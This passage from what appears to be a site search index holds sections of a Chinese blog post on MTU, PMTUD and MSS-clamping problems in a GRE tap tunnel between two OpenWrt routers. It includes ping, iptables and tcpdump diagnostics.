multicast\u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u80fdproxy\u591a\u64ad\u5305\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u4e24\u4e2a\u7f51\u7edc\u4e92\u76f8\u53d1\u73b0\u3002</p> <p>2024/4/17 update: \u4eca\u5929\u5728\u641c\u7d22 vxlan \u65f6\u53d1\u73b0\u4e86\u4e00\u7bc7\u535a\u5ba2\u4e5f\u9047\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002\u4ed6\u7684\u89e3\u51b3\u65b9\u6848\u662f\u901a\u8fc7\u8bbe\u7f6e bridge-nf-call-iptables \u4f7f\u5f97\u6865\u63a5\u7684\u6570\u636e\u5305\u4e5f\u901a\u8fc7 iptable\uff0c\u7136\u540e\u518d\u901a\u8fc7 iptable \u4fee\u6b63 MSS\u3002\u56e0\u6b64\u5176\u65b9\u6848\u5bf9\u4e8e UDP \u4ecd\u7136\u5b58\u5728\u95ee\u9898\u3002\u4e0d\u8fc7\u5c06 bridge \u7684\u5305\u8fdb\u884c\u4e09\u5c42\u7684\u5904\u7406\u7684\u601d\u8def\u662f\u4e00\u6837\u7684\u3002\u5728 OpenWrt \u8bbe\u5907\u95f4\u4f7f\u7528 VXLAN \u521b\u5efa\u96a7\u9053 \u2013 t123yh's Blog \u770b\u6765\u8fd9\u4e2a\u95ee\u9898\u5e76\u4e0d\u662f gre \u624d\u4f1a\u6709\u7684\u3002\u90a3\u6709\u6ca1\u6709\u66f4\u52a0\u73b0\u4ee3\u7684\u4e8c\u5c42\u96a7\u9053\u534f\u8bae\uff0c\u80fd\u591f\u81ea\u52a8\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u4e8c\u5c42\u96a7\u9053\u65b9\u6848","title":"\u4e8c\u5c42\u96a7\u9053\u65b9\u6848","text":"<p>\u96a7\u9053\u65b9\u6848\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <ul> <li>\u4e24\u4e2a\u8def\u7531\u5668\u95f4\u901a\u8fc7 WAN \u53e3 IPv4 \u5efa\u7acb GRE Tap \u96a7\u9053</li> <li>op1 \u4e0a\u5c06\u76f4\u63a5\u5c06 tap \u63a5\u53e3\u6865\u63a5\u5230\u5230\u539f\u6709 br-lan \u4e0a</li> <li>op2 \u4fdd\u7559\u4e86\u539f\u672c\u81ea\u5df1\u7684 lan\uff0c\u7136\u540e\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684 br-lan2\uff0c\u8fde\u63a5\u4e86 gre tap \u63a5\u53e3\u548c eth2 \u63a5\u53e3\u3002</li> </ul> <p>op2 \u662f PVE Host \u4e0a\u4e00\u4e2a\u5bb9\u5668</p> <p>op2\u662fPVE\u4e0a\u7684\u4e00\u4e2aLXC\u5bb9\u5668\uff0c\u5206\u914d\u4e86eth0, eth1, eth2\u5206\u522b\u5bf9\u5e94wan, lan1, lan2</p> <ul> <li>op2 \u4fa7\u5c06\u4e00\u4e2a\u65e0\u7ebf\u8def\u7531\u5668\u8fde\u63a5\u5230 PVE host\uff08\u8f6f\u8def\u7531\uff09\u4e00\u4e2a\u7f51\u53e3\uff0c\u8be5\u7f51\u53e3\u4f4d\u4e8e PVE vmbr2 \u4e0b\u3002op2 eth2 \u4e5f\u8fde\u63a5\u5230\u4e86 vmbr2\u3002</li> </ul> <ul> <li>\u901a\u8fc7\u5207\u6362\u65e0\u7ebf\u8def\u7531\u5668\u8fde\u63a5\u5230 PVE host \u4e0d\u540c\u7f51\u53e3\uff08\u5bf9\u5e94 vmbr1 \u548c vmbr2\uff09\uff0c\u53ef\u4ee5\u63a7\u5236\u65e0\u7ebf\u8def\u7531\u5668\u4f4d\u4e8e lan1 \u8fd8\u662f lan2\u3002</li> </ul> <p>VLAN \u5207\u6362 SSID \u65b9\u6848</p> <p>\u521a\u5f00\u59cb\u60f3\u4e86\u4e00\u4e2a\u66f4\u590d\u6742\u4e0d\u7528\u6539\u52a8AP\u7f51\u7ebf\u7684\u65b9\u6848\u3002\u5c06AP\u901a\u8fc7\u4e00\u6839\u7ebf\u548c\u8f6f\u8def\u7531\u8fde\u63a5\uff0c\u7136\u540e\u521b\u5efa2\u4e2avlan\u3002AP\u4e0a\uff0c\u521b\u5efa\u4e24\u4e2a\u4e0d\u540cSSID\u7ed1\u5b9a\u5230\u4e0d\u540cVLAN\u63a5\u53e3\u4e0a\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7\u66f4\u6539\u8fde\u63a5\u7684WiFi\u6765\u5207\u6362lan1\u548clan2\u4e86\u3002\u4e0d\u8fc7PVE\u4e0avlan\u8c8c\u4f3c\u914d\u7f6e\u6709\u70b9\u590d\u6742\uff1a\u53ef\u80fd\u9700\u8981\u521b\u5efa\u4e00\u4e2avlan awareness\u7684vmbr1\uff0c\u7136\u540eop2\u8fde\u63a5\u5230vmbr1\u7684eth1\u548ceth2\u6307\u5b9a\u4e0d\u540cvlan id\u3002\u4f46\u662f\u6211\u6ca1\u60f3\u6e05\u695avmbr1\u4e0buntagged\u7684\u63a5\u53e3\u600e\u4e48\u529e\uff1fvmbr1\u8bbe\u7f6e\u4e86awareness\u540e\u8fd8\u80fd\u8fde\u63a5untagged\u7684\u7aef\u53e3\u5417\uff1f\u56e0\u4e3a\u4e0d\u592a\u4e86\u89e3PVE VLAN awareness bridge\u7684\u66f4\u8be6\u7ec6\u5185\u5bb9\uff0c\u52a0\u4e0a\u8def\u7531\u5668\u5c31\u5728\u624b\u8fb9\uff0c\u6362\u6761\u7ebf\u4e5f\u5f88\u5feb\uff0c\u56e0\u6b64\u5c31\u6ca1\u6709\u4f7f\u7528\u8be5\u65b9\u6848\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"<p>\u5b9e\u73b0\u4e0a\u8ff0\u65b9\u6848\u540e\uff0c\u786e\u5b9e\u8ba9\u4e00\u5f00\u59cb\u7684 VR \u4e32\u6d41\u8f6f\u4ef6\u53ef\u4ee5\u5de5\u4f5c\u4e86\uff0c\u4f46\u662f\u786e\u9047\u5230\u4e86\u4e00\u4e9b\u610f\u5916\u7684\u95ee\u9898\u3002</p> <p>\u6211\u53d1\u73b0\u6211\u7684\u624b\u673a\u5e73\u677f\u90fd\u65e0\u6cd5\u4f7f\u7528 moonlight \u4e32\u6d41\u6211\u4f4d\u4e8e op1 \u4e0b\u7684\u53f0\u5f0f\u673a KVM-win10 \u4e86\u3002</p> <ul> <li>moonlight \u663e\u793a\u5728\u7ebf\uff08\u8fd9\u4e2a\u9700\u8981\u5f00\u542f MSS clamping\uff09\uff0c\u4f46\u662f\u4e00\u8fde\u63a5\u5c31\u62a5\u9519\u3002\u62a5\u9519\u8ba9\u68c0\u67e5 UDP \u7aef\u53e3 478000 \u662f\u5426\u5f00\u653e\u3002</li> <li>\u7b14\u8bb0\u672c\u540c\u6837\u8fde\u63a5\u7684 WiFi\uff0c\u5374\u786e\u80fd\u591f\u6b63\u5e38\u4e32\u6d41</li> </ul> <p>\u4ee5\u524d\u4e5f\u9047\u5230\u8fd9\u6837\u80fd ping \u901a\uff0c\u4f46\u662f\u4e00\u53d1\u9001\u6570\u636e\u5c31\u51fa\u95ee\u9898\u7684\u73b0\u8c61\u3002\u95ee\u9898\u4e00\u822c\u662f\u54ea\u91cc\u7684\u63a5\u53e3 MTU \u8bbe\u7f6e\u4e0d\u6b63\u786e\u5bfc\u81f4\u7684\uff0c\u56e0\u6b64\u8fd9\u6b21\u4e5f\u662f\u5f80 MTU \u8fd9\u65b9\u9762\u6392\u67e5\u95ee\u9898\u3002 \u52a0\u4e0a\u4e4b\u524d\u9047\u5230\u7684 MSS \u95ee\u9898\uff0c\u4e8e\u662f\u8fd9\u6b21\u76f8\u5f53\u4e8e\u628a\u6211\u77e5\u9053\u7684\u90fd\u7ed3\u5408\u8d77\u6765\uff0c\u770b\u80fd\u5426\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#ip-\u5206\u7247","title":"IP \u5206\u7247","text":"<p>MTU\uff0c\u94fe\u8def\u5c42\u7684\u6982\u5ff5\uff0c\u8868\u793a\u80fd\u627f\u8f7d\u7684\u7f51\u7edc\u5c42\u53ca\u4ee5\u4e0a\u7684\u5305\u7684\u5927\u5c0f\u3002\u6b63\u5e38\u4ee5\u592a\u7f51\u5e27\u7684 payload \u90e8\u5206\u8303\u56f4\u5e94\u8be5\u5728 46B - 1500B \u4e4b\u95f4\uff0c\u4e5f\u5c31\u662f MTU \u6700\u5927\u4e3a 1500\u3002 </p> <p>\u5f53\u6211\u4eec\u4f7f\u7528 GRE\uff0cWireguard \u7b49\u96a7\u9053\u65f6\uff0c\u5b9e\u9645\u7684 MTU \u9700\u8981\u51cf\u53bb\u989d\u5916 Header \u7684\u5f00\u9500\uff0c\u56e0\u6b64\u5c31\u4f1a\u5c0f\u4e8e 1500\u3002\u6bd4\u5982 wg ipv4 = 1440, wg ipv6 = 1420\u3002</p> <p>\u5f53\u4e0a\u5c42\u534f\u8bae\u5305\u5927\u5c0f\u8d85\u8fc7\u94fe\u8def\u5c42 MTU \u65f6\uff0c\u6211\u4eec\u9700\u8981\u4e00\u79cd\u673a\u5236\u5c06\u5305\u62c6\u5206\uff0c\u7136\u540e\u5408\u5e76\uff08\u91cd\u7ec4\uff09\u3002\u8fd9\u4e2a\u529f\u80fd\u662f\u5728 IP \u5c42\u5b9e\u73b0\u7684\u3002IPv4 Header \u4e2d\u6709 Flag \u548c Fragment offset\uff0c\u7528\u4e8e\u5b9e\u73b0\u5206\u7247\u4e0e\u5408\u5e76\u3002</p> <p></p> <p>Don't fragment \u6807\u5fd7</p> <p>ipv4\u5934\u4e2dFlags\u53ef\u4ee5\u8bbe\u7f6eDF flag\uff0c\u8868\u793a\u7981\u6b62\u5206\u7247\u3002\u8fd9\u6837\u5f53\u9700\u8981\u5206\u7247\u65f6\uff0crouter\u8282\u70b9\u5e94\u8be5\u8fd4\u56deICMP\u00a0Fragmentation Needed (Type 3, Code 4)\u3002ipv6\u7531\u4e8e\u7981\u6b62\u4e86router\u5206\u7247\uff08\u53ea\u80fd\u901a\u4fe1\u7aef\u70b9\u8fdb\u884c\u5206\u7247\uff09\uff0c\u56e0\u6b64header\u4e2d\u6ca1\u6709\u4e5f\u4e0d\u9700\u8981\u8be5\u6807\u5fd7\u3002</p> <p>ipv4 \u548c ipv6 \u5206\u7247\u7684\u533a\u522b</p> <p>ipv4\u4e2d\u95f4\u8def\u7531\u5668\u53ef\u4ee5\u5bf9\u5305\u8fdb\u884c\u5206\u7247\uff0c\u6700\u540e\u6240\u6709\u7684\u5206\u7247\u5305\u5728\u76ee\u7684\u8282\u70b9\u5408\u5e76 \u800cipv6\u7981\u6b62\u4e86\u8def\u7531\u5668\u5bf9\u5305\u8fdb\u884c\u5206\u7247\uff0c\u5206\u7247\u5fc5\u987b\u5728\u6e90\u548c\u76ee\u7684\u8282\u70b9\u4e0a\u8fdb\u884c\u3002\u56e0\u6b64\u901a\u4fe1\u8282\u70b9\u95f4\u5fc5\u987b\u5148\u8fdb\u884cPMTUD\uff08\u8def\u5f84MTU\u53d1\u73b0\uff09\uff0c\u5426\u5219\u9047\u5230MTU\u4e0d\u591f\u65f6\uff0c\u4e2d\u95f4\u8282\u70b9\u4f1a\u8fd4\u56deICMPv6 Packet Too Big\u00a0(Type 2)\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#pmtud","title":"PMTUD","text":"<p>PMTUD\uff0c\u5373 Path MTU Dsicovery\uff0c\u7528\u4e8e\u53d1\u73b0\u901a\u4fe1\u8def\u5f84\u4e0a\u7684\u6700\u5927 MTU\uff0c\u7528\u6765\u907f\u514d\u5206\u7247\u3002</p> <p>PMTUD \u5e38\u89c1\u7684\u662f\u57fa\u4e8e ICMP \u7684\u65b9\u6cd5\uff1a</p> <ul> <li>\u5bf9\u4e8e IPv4\uff0c\u53ef\u4ee5\u8bbe\u7f6e DF \u6807\u5fd7\uff0c\u5982\u679c\u6536\u5230 Fragmentation Needed\uff0c\u5c31\u51cf\u5c0f MTU\uff08ICMP \u6570\u636e\u4e2d\u5305\u542b\u4e0b\u4e00\u6761\u9700\u8981\u7684 MTU\uff09</li> <li>\u5bf9\u4e8e IPv6\uff0c\u6ca1\u6709\u4e0d\u5206\u7247\u6807\u5fd7\u3002\u8bbe\u7f6e\u521d\u59cb MTU \u4e3a\u7f51\u5361 MTU\uff0c\u5982\u679c\u4e2d\u95f4\u8bbe\u5907\u8fd4\u56de ICMPv6 type 2 \u6d88\u606f\uff0c\u5c31\u51cf\u5c11 MTU\u3002</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ping \u6765\u6d4b\u8bd5</p> <pre><code>$ ping www.baidu.com -l 1372 -f\n\u6b63\u5728 Ping www.a.shifen.com [182.61.200.6] \u5177\u6709 1372 \u5b57\u8282\u7684\u6570\u636e:\n\u6765\u81ea 182.61.200.6 \u7684\u56de\u590d: \u5b57\u8282=1372 \u65f6\u95f4=33ms TTL=46\n\n$ ping www.baidu.com -l 1373 -f\n\u6b63\u5728 Ping www.a.shifen.com [182.61.200.6] \u5177\u6709 1373 \u5b57\u8282\u7684\u6570\u636e:\n\u9700\u8981\u62c6\u5206\u6570\u636e\u5305\u4f46\u662f\u8bbe\u7f6e DF\u3002\n</code></pre> <p>linux ping \u53c2\u6570</p> <p>\u4f7f\u7528<code>-s</code>\u6307\u5b9a\u6570\u636e\u90e8\u5206\u5927\u5c0f\uff0c\u4f7f\u7528<code>-M do</code>\u7981\u6b62\u5206\u7247</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u5230\u767e\u5ea6\u7684 PTMU \u4e3a 1372\uff08\u56e0\u4e3a\u5b9e\u9645\u4e2d\u7ecf\u8fc7\u4e86\u4e00\u4e2a 1400 \u7684 wg \u96a7\u9053\uff09</p> <ul> <li>\u5176\u4e2d <code>-l</code> \u6307\u5b9a icmp data \u90e8\u5206\uff0c\u56e0\u6b64\u5b9e\u9645 ip \u5305\u5927\u5c0f\u4e3a\uff1a20 + 8 + 1372 = 1400</li> <li><code>-f</code>\u7981\u7528\u5206\u7247</li> </ul> <p>\u4e0b\u56fe\u662f\u4f7f\u7528 wireshark \u6293\u5230\u7684 ICMP \u5305\u622a\u56fe\u3002type \u4e3a destination unreachable\uff0ccode \u8868\u660e\u8fd9\u662f\u7531\u4e8e\u9700\u8981\u5206\u7247\u5bfc\u81f4\u7684\u3002ICMP \u4e2d\u8fd8\u5305\u542b\u4e86\u4e0b\u4e00\u8df3\u7684 MTU\uff081400\uff09\uff0c\u5e76\u4e14\u5c06\u539f\u672c\u7684 ip \u5305\u653e\u5728\u4e86\u7ed3\u5c3e\uff08\u53ef\u4ee5\u770b\u5230\u539f\u672c\u7684 IP \u5934\uff0c\u548c icmp \u5934\uff09 </p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#pmtud-\u5931\u8d25\u4e0e-mss-clamping","title":"PMTUD \u5931\u8d25\u4e0e MSS clamping","text":"<p>\u5b9e\u9645\u8def\u7531\u5668\u7531\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u4f1a\u7981\u6b62\u8f6c\u53d1 ICMP \u6d88\u606f\uff0c\u56e0\u6b64\u4f1a\u5bfc\u81f4 PMTUD \u5931\u6548\u3002\u8fd9\u6837\u5bf9\u4e8e ipv6\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u9ed1\u6d1e\u8fde\u63a5\u73b0\u8c61\uff1aTCP \u4e09\u6b21\u63e1\u624b\u6210\u529f\uff08\u6570\u636e\u5c0f\u4e8e MTU\uff09\uff0c\u4f46\u662f\u53d1\u9001\u6570\u636e\u6ca1\u6709\u54cd\u5e94\uff08\u8d85\u8fc7\u8def\u5f84 MTU\uff0c\u5305\u88ab\u4e22\u5f03\uff09\u3002</p> <p>\u56e0\u6b64\u6709\u4e9b\u8def\u7531\u5668\u63d0\u4f9b\u4e86 MSS clamping \u529f\u80fd\u3002\u8def\u7531\u5668\u4f1a\u5bf9\u8f6c\u53d1\u7684 TCP \u5305\u7684 MSS \u8fdb\u884c\u4fee\u6539\u3002\u8fd9\u6837\u5c31\u80fd\u4fdd\u8bc1\u901a\u4fe1\u53cc\u65b9\u4e0d\u4f1a\u4ea7\u751f\u8d85\u8fc7 MTU \u7684\u5305\uff0c\u4ece\u800c\u907f\u514d\u5206\u7247\u3002</p> <p>MSS \u4ecb\u7ecd</p> <ul> <li>MSS (maximum segment size) \u662f TCP \u4e2d\u7684\u6982\u5ff5\uff0c\u662f\u8fde\u63a5\u53cc\u65b9\u80fd\u591f\u63a5\u6536\u7684\u6700\u5927 segment \u5927\u5c0f\u3002</li> <li>MSS = MTU - IP header - TCP header\u3002MTU \u4e3a 1500 \u65f6\uff0cMSS \u4e3a 1460</li> <li>MSS \u4f1a\u5728 TCP \u4e09\u6b21\u63e1\u624b\u65f6\u8fdb\u884c\u534f\u5546\uff0c\u4f5c\u4e3a TCP \u5934\u4e2d option \u7684\u5185\u5bb9\u3002[\u5e76\u4e14\u53ea\u80fd\u5728 SYNC \u88ab\u8bbe\u7f6e\u65f6\u624d\u80fd\u5305\u542b\u3002](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#:~:text=urgent%20data%20byte.-,Options,-(Variable%200%E2%80%93320) </li> </ul> <p>MSS clamping \u57fa\u4e8e iptable \u5b9e\u73b0\u3002\u53ef\u4ee5\u8bbe\u7f6e\u9759\u6001\u7684\u6570\u503c\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u6210\u6839\u636e\u51fa\u53e3\u7f51\u5361 MTU \u81ea\u52a8\u8bbe\u7f6e\u3002</p> <pre><code># \u56fa\u5b9a\u8bbe\u7f6e\u62101460\niptables -t mangle -A POSTROUTING -p tcp --tcp-flags SYN,RST SYN -o eth0 -j TCPMSS --set-mss 1460\n\n# \u6839\u636ePMTU\u81ea\u52a8\u8bbe\u7f6e\niptables -t mangle -A POSTROUTING -p tcp --tcp-flags SYN,RST SYN -o eth0 -j TCPMSS --clamp-mss-to-pmtu\n</code></pre> <p>openwrt \u53ea\u5bf9 forward \u8fdb\u884c MSS clamping\uff1f</p> <p>openwrt\u5f00\u542f MSS clamping\u540e\uff0c\u4f1a\u5728mangle_forward\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u89c4\u5219\u3002\u56e0\u6b64\u8c8c\u4f3c\u53ea\u5bf9forward\u751f\u6548</p> <pre><code>chain mangle_forward {\n  type filter hook forward priority mangle; policy accept;\n\n  iifname \"warp\" tcp flags syn tcp option maxseg size set rt mtu comment \"!fw4: Zone warp IPv4/IPv6 ingress MTU fixing\"\n  oifname \"warp\" tcp flags syn tcp option maxseg size set rt mtu comment \"!fw4: Zone warp IPv4/IPv6 egress MTU fixing\"\n}\n</code></pre> <p>MSS clamping \u662f\u53cc\u5411\u7684</p> <p>MTU\u7684\u5f71\u54cd\u662f\u5355\u9879\u7684\uff0c\u5373\u8def\u7531\u5668\u5f80\u4e00\u4e2a\u63a5\u53e3\u8f6c\u53d1\u65f6\uff0c\u5982\u679c\u5305\u5927\u4e8e\u63a5\u53e3MTU\uff0c\u5c31\u4f1a\u8fdb\u884c\u5206\u7247\u3002MSS clamping\u540e\uff0c\u4ece\u8be5\u63a5\u53e3\u8fdb\u5165\u548c\u51fa\u53bb\u7684\u5305\u90fd\u4f1a\u88ab\u4fee\u6539MSS\u3002\u8fd9\u91cc\u5217\u4e00\u5f20\u53c2\u8003\u6587\u732e\u4e2d\u7684\u56fe</p> <p></p> <p>Openwrt \u7684 MSS \u529f\u80fd\u653e\u5728\u9632\u706b\u5899 Zone \u8bbe\u7f6e\u4e2d\uff08\u6bd5\u7adf\u662f\u57fa\u4e8e iptable \u7684\uff0c\u786e\u5b9e\u662f\u9632\u706b\u5899\u529f\u80fd\uff09\uff0c\u9ed8\u8ba4 WAN zone \u7684 MSS clamping \u662f\u52fe\u9009\u4e0a\u7684\u3002\u5982\u679c\u6709 wireguard \u7b49\u96a7\u9053\u63a5\u53e3\u7684\u8bdd\uff0c\u5efa\u8bae\u4e5f\u52fe\u4e0a\uff0c\u56e0\u6b64\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u5728\u8def\u7531\u5668\u4e0a\u5206\u7247\uff0c\u63d0\u5347 TCP \u6027\u80fd\u3002</p> <p></p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#mtu-1508","title":"MTU 1508\uff1f","text":"<p>How to correctly set MTU of all my network interfaces (wan and lan)? - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum RFC 4638 - Accommodating a Maximum Transit Unit/Maximum Receive Unit (MTU/MRU) Greater Than 1492 in the Point-to-Point Protocol over Ethernet (PPPoE) (ietf.org)</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u63d0\u5230\u96a7\u9053\u5f80\u5f80\u9700\u8981\u9650\u5236 MSS \u6765\u907f\u514d\u5206\u7247\uff1a\u4ec0\u4e48\u662f MSS\uff08\u6700\u5927\u5206\u6bb5\u5927\u5c0f\uff09\uff1f | Cloudflare (cloudflare-cn.com)</li> <li>\u63d0\u5230\u4e86 GRE \u4e0b MSS \u7684\u8ba1\u7b97\uff1a\u4ec0\u4e48\u662f GRE \u96a7\u9053\uff1f| GRE \u534f\u8bae\u5982\u4f55\u5de5\u4f5c | Cloudflare (cloudflare-cn.com)</li> <li>\u540c\u6837\u4ecb\u7ecd\u4e86 MTU, MSS, PMTUD \u8054\u7cfb\uff1aMTU TCP-MSS \u8be6\u89e3 - \u77e5\u4e4e (zhihu.com)</li> <li>\u63d0\u5230\u4e86 1\uff09v4 \u548c v6 \u7684\u5dee\u5f02\uff1b2\uff09\u4e2d\u95f4\u8def\u7531\u5668\u7981\u7528 ICMP \u5bfc\u81f4\u9ed1\u6d1e\u8fde\u63a5\u73b0\u8c61\uff1b3\uff09\u6709\u4e9b\u8def\u7531\u5668\u63d0\u4f9b MSS \u65b9\u6848\u89e3\u51b3 PMTUD \u5931\u8d25\u7684\u95ee\u9898\u3002Path MTU Discovery - Wikipedia</li> <li>PMTUD \u5bfc\u81f4 black holes\uff1aBlack hole (networking) - Wikipedia</li> <li>openwrt \u9ed8\u8ba4 wan \u662f MSS clamping \u7684\uff0c\u53ea\u5f71\u54cd forward\uff0c\u4e0d\u5f71\u54cd output\u3002Firewall mtu_fix confusion - Talk about Documentation - OpenWrt Forum</li> <li>iptable TCPMSS target\uff1aLinux Packet Filtering and iptables - TCPMSS target (linuxtopia.org)</li> </ul>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u5b9a\u4f4d\u95ee\u9898\u4f46\u65e0\u6cd5\u89e3\u51b3","title":"\u5b9a\u4f4d\u95ee\u9898\uff08\u4f46\u65e0\u6cd5\u89e3\u51b3\uff09","text":"","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u5b9e\u9a8c\u4e00\u8bbe\u7f6e-bridge-mtu-\u4e0d\u5f71\u54cd\u63a5\u6536\u53ea\u5f71\u54cd\u53d1\u9001","title":"\u5b9e\u9a8c\u4e00\uff1a\u8bbe\u7f6e bridge MTU \u4e0d\u5f71\u54cd\u63a5\u6536\u53ea\u5f71\u54cd\u53d1\u9001","text":"<p>kvm-win10 ping op1\uff0c\u7ecf\u8fc7\u7684\u8def\u5f84\uff1a</p> <pre><code>kvm-win10 (1500)-&gt; pve vmbr1(1280) -&gt; op1: eth1 (1500)-&gt;  br-lan (1280)\n</code></pre> <p>\u867d\u7136 op1 br-lan mtu \u5df2\u7ecf\u8bbe\u7f6e\u6210\u4e86 1280\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u7531\u4e8e\u5305\u662f\u4ece eth1 \u8fdb\u5165\u7684\uff0c\u6240\u4ee5\u5e76\u4e0d\u4f1a\u4e22\u6389\u3002</p> <ul> <li>\u4e2d\u9014 vmbr1 \u6ca1\u6709\u628a\u5305\u4e22\u6389\uff0c\u6211\u731c\u6d4b\u662f\u56e0\u4e3a\u5e95\u5c42\u7684\u63a5\u53e3\u5b9e\u9645 MTU \u90fd\u662f 1500 \u7684\uff0c\u56e0\u6b64\u80fd\u591f\u63a5\u6536\u5c31\u4e0d\u4f1a\u4e22\u6389\u3002\u548c bridge \u81ea\u8eab MTU \u6ca1\u6709\u5173\u7cfb</li> </ul> <p>\u7136\u540e\u53ef\u4ee5\u53d1\u73b0op1 response \u65f6\u6839\u636e br-lan \u7684 MTU \u8fdb\u884c\u4e86\u5206\u7247\uff0c\u8fd9\u662f\u7b26\u5408 MTU \u4e00\u5f00\u59cb\u7684\u8bbe\u8ba1\u7684\u3002</p> <pre><code>$ ping 192.168.35.1 -l 1472 -f\n\n\u6b63\u5728 Ping 192.168.35.1 \u5177\u6709 1472 \u5b57\u8282\u7684\u6570\u636e:\n\u6765\u81ea 192.168.35.1 \u7684\u56de\u590d: \u5b57\u8282=1472 \u65f6\u95f4&lt;1ms TTL=64\n\u6765\u81ea 192.168.35.1 \u7684\u56de\u590d: \u5b57\u8282=1472 \u65f6\u95f4&lt;1ms TTL=64\n</code></pre> <pre><code>root@op1 \u279c  ~ tcpdump -ni eth1 icmp and host 192.168.35.5\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n20:24:59.427833 IP 192.168.35.5 &gt; 192.168.35.1: ICMP echo request, id 1, seq 1386, length 1480\n20:24:59.427856 IP 192.168.35.1 &gt; 192.168.35.5: ICMP echo reply, id 1, seq 1386, length 1256\n20:24:59.427858 IP 192.168.35.1 &gt; 192.168.35.5: ip-proto-1\n</code></pre>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u5b9e\u9a8c\u4e8c\u540c\u4e00\u4e2a\u4e8c\u5c42\u65e0\u6cd5\u53d1-icmp-unreachable","title":"\u5b9e\u9a8c\u4e8c\uff1a\u540c\u4e00\u4e2a\u4e8c\u5c42\u65e0\u6cd5\u53d1 ICMP 